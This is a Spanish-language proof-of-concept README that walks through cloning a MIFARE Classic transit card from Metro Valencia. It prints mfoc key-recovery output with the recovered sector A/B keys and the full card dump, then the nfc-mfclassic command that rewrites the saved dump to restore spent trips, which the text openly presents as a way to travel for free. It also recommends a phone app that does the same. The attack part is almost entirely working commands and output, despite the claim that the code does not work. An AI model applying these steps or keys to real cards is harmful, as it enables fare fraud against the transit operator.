# Clonar tarjeta NFC

##### *En este PoC vamos a aprender a clonar tarjetas NFC mediante un ataque a sus claves. Este PoC es totalmente didáctico para aprender la tecnología NFC. Para ello utilizaremos de ejemplo tarjetas del Metro de Valencia, las cuales serán destruidas al final de este PoC debido a la ilegalidad de su uso una vez clonadas. 

##### *ACTUALMENTE METRO VALENCIA NO TIENE NINGÚN SISTEMA DE SEGURIDAD PARA DETECTAR SI LA TARJETA HA SIDO CLONADA/MODIFICADA. ÚNICAMENTE NOS BLOQUEARA LA TARJETA EN UNA LISTA NEGRA EN CASO DE QUE DETECTE ANOMALÍAS EN ELLA. METRO VALENCIA ES CONSCIENTE DE ESTE FALLO DE SEGURIDAD, PERO NO TIENE MEDIOS PARA PALIARLO. 

##### TODO EL CÓDIGO QUE VAIS A VER NO ES FUNCIONAR PARA NO FACILITAR LA PIRATERÍA DE ESTAS TARJETAS.

###### SITUACIÓN: adquirimos una tarjeta de transporte y la recargamos con los viajes deseados. Para este PoC adquirimos la tarjeta del metro Valencia con 10 viajes en zona AB.  

###### Necesitamos un lector, escritor NFC como [este](https://www.amazon.es/dp/B07MVBHR29/ref=cm_sw_r_tw_dp_U_x_K8ndDbXRKSA18)
![lectorNFC](https://github.com/santirn/Clonar-tarjeta-NFC/blob/master/1.jpg)


Conectamos nuestro lector NFC, ponemos nuestra tarjeta de metro y comprobamos que nuestro sistema lo detecta.
```console
$ sudo nfc-list
nfc-list uses libnfc 1.7.1
NFC device: ACS / ACR122U PICC Interface opened
1 ISO14443A passive target(s) found:
ISO/IEC 14443A (106 kbps) target:
ATQA (SENS_RES): 00  04  
UID (NFCID1): ab  c9  67  00  
SAK (SEL_RES): 08 
````

Ahora haremos un dump a un archivo .dmp que contendra todos los del sector A y B y el codigo en hexadecimal de la tarjeta. 

Este archivo contendrá la información de la tarjeta con los 10 viajes.
````console 
# mfoc -O 10viajes.dmp
Found Mifare Classic 1k tag
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04
* UID size: single
* bit frame anticollision supported
       UID (NFCID1): ab  c9  67  00  
      SAK (SEL_RES): 08
* Not compliant with ISO/IEC 14443-4
* Not compliant with ISO/IEC 18092

Fingerprinting based on MIFARE type Identification Procedure:
* MIFARE Classic 1K
* MIFARE Plus (4 Byte UID or 4 Byte RID) 2K, Security level 1
* SmartMX with MIFARE 1K emulation
Other possible matches based on ATQA & SAK values:

Try to authenticate to all sectors with default keys...
Symbols: '.' no key found, '/' A key found, '\' B key found, 'x' both keys found
[Key: ffffffffffff] -> [................]
[Key: a0a1a2a3a4a5] -> [////////////////]
[Key: d3f7d3f7d3f7] -> [////////////////]
[Key: 000000000000] -> [////////////////]
[Key: b0b1b2b3b4b5] -> [xxxxxxxxxxxx////]
[Key: 4d3a99c351dd] -> [xxxxxxxxxxxx////]
[Key: 1a982c7e459a] -> [xxxxxxxxxxxx////]
[Key: aabbccddeeff] -> [xxxxxxxxxxxx////]
[Key: 714c5c886e97] -> [xxxxxxxxxxxx////]
[Key: 587ee5f9350f] -> [xxxxxxxxxxxx////]
[Key: a0478cc39091] -> [xxxxxxxxxxxx////]
[Key: 533cb6c723f6] -> [xxxxxxxxxxxx////]
[Key: 8fd0a4f256e9] -> [xxxxxxxxxxxx////]

Sector 00 -  FOUND_KEY   [A]  Sector 00 -  FOUND_KEY   [B]
Sector 01 -  FOUND_KEY   [A]  Sector 01 -  FOUND_KEY   [B]
Sector 02 -  FOUND_KEY   [A]  Sector 02 -  FOUND_KEY   [B]
Sector 03 -  FOUND_KEY   [A]  Sector 03 -  FOUND_KEY   [B]
Sector 04 -  FOUND_KEY   [A]  Sector 04 -  FOUND_KEY   [B]
Sector 05 -  FOUND_KEY   [A]  Sector 05 -  FOUND_KEY   [B]
Sector 06 -  FOUND_KEY   [A]  Sector 06 -  FOUND_KEY   [B]
Sector 07 -  FOUND_KEY   [A]  Sector 07 -  FOUND_KEY   [B]
Sector 08 -  FOUND_KEY   [A]  Sector 08 -  FOUND_KEY   [B]
Sector 09 -  FOUND_KEY   [A]  Sector 09 -  FOUND_KEY   [B]
Sector 10 -  FOUND_KEY   [A]  Sector 10 -  FOUND_KEY   [B]
Sector 11 -  FOUND_KEY   [A]  Sector 11 -  FOUND_KEY   [B]
Sector 12 -  FOUND_KEY   [A]  Sector 12 -  UNKNOWN_KEY [B]
Sector 13 -  FOUND_KEY   [A]  Sector 13 -  UNKNOWN_KEY [B]
Sector 14 -  FOUND_KEY   [A]  Sector 14 -  UNKNOWN_KEY [B]
Sector 15 -  FOUND_KEY   [A]  Sector 15 -  UNKNOWN_KEY [B]


Using sector 00 as an exploit sector
Sector: 12, type B, probe 0, distance 18504 .....
  Found Key: B [ad4fb33388bf]
Sector: 13, type B, probe 0, distance 18502 .....
  Found Key: B [2a6d9205e7ca]
Sector: 14, type B, probe 0, distance 18500 .....
Sector: 14, type B, probe 1, distance 18502 .....
Sector: 14, type B, probe 2, distance 18502 .....
  Found Key: B [b8a1f613cf3d]
Sector: 15, type B, probe 0, distance 18502 .....
  Found Key: B [bedb604cc9d1]
Auth with all sectors succeeded, dumping keys to a file!
Block 63, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  4b  44  bb  5a  00  00  00  00  00  00
Block 62, type A, key a0a1a2a3a4a5 :00  00  51  5f  03  59  ef  00  00  00  00  00  4d  49  43  00
Block 61, type B, key bedb604cc9d1 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 60, type B, key bedb604cc9d1 :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 59, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  0f  00  ff  e5  00  00  00  00  00  00
Block 58, type B, key b8a1f613cf3d :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 57, type B, key b8a1f613cf3d :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 56, type B, key b8a1f613cf3d :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 55, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  0f  00  ff  4f  00  00  00  00  00  00
Block 54, type B, key 2a6d9205e7ca :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 53, type B, key 2a6d9205e7ca :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 52, type B, key 2a6d9205e7ca :dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd  dd
Block 51, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  1e  11  ee  5a  00  00  00  00  00  00
Block 50, type B, key ad4fb33388bf :00  01  59  01  00  6f  00  01  00  00  00  00  8c  c3  00  00
Block 49, type B, key ad4fb33388bf :01  01  01  ee  ee  ee  ee  ee  00  00  00  00  00  00  00  00
Block 48, type A, key a0a1a2a3a4a5 :88  01  00  84  00  04  b0  1a  00  00  5d  00  01  05  00  f1
Block 47, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 46, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 45, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 44, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 43, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 42, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 41, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 40, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 39, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 38, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 37, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 36, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 35, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 34, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 33, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 32, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 31, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 30, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 29, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 28, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 27, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 26, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 25, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 24, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 23, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 22, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 21, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 20, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 19, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 18, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 17, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 16, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 15, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 14, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 13, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 12, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 11, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 10, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 09, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 08, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 07, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  78  77  88  69  00  00  00  00  00  00
Block 06, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 05, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 04, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 03, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  61  e7  89  c1  00  00  00  00  00  00
Block 02, type A, key a0a1a2a3a4a5 :00  00  00  00  00  00  00  00  09  38  09  38  09  38  09  38
Block 01, type A, key a0a1a2a3a4a5 :d2  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00
Block 00, type A, key a0a1a2a3a4a5 :8e  db  1a  2a  65  88  04  00  48  85  14  90  59  80  01  11
````

De esta manera podemos gastar los viajes que queramos y cuando nos apetezca solo tendremos que volver a escribir en la tarjeta original el dumpeo con los 10 viajes para recargara.

Para ello usaremos nfc-mfclassic:
````console
# nfc-mfclassic w B 10viajes.dmp 10viajes.dmp
NFC reader: pn532_uart:/dev/ttyUSB0 opened
Found MIFARE Classic card:
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04
       UID (NFCID1): ab  c9  67  00  
      SAK (SEL_RES): 08
Guessing size: seems to be a 1024-byte card
Writing 64 blocks |..failed to write trailer block 3
x............................................................|
Done, 62 of 64 blocks written.
````

# Bien, pues si esto ha sido fácil, hay otro método mas fácil aun.

[MIFARE Classic Tool](https://apkpure.com/es/mifare-classic-tool-mct/de.syss.MifareClassicTool) es una aplicación que utiliza nuestro chip NFC del móvil para realizar todas estas funciones de una manera más simplificada.

Hay una [lista](https://www.shopnfc.com/en/content/7-nfc-compatibility)  de los móviles cuyo chip NFC es compatible con la tecnología de  MIFARE 1k
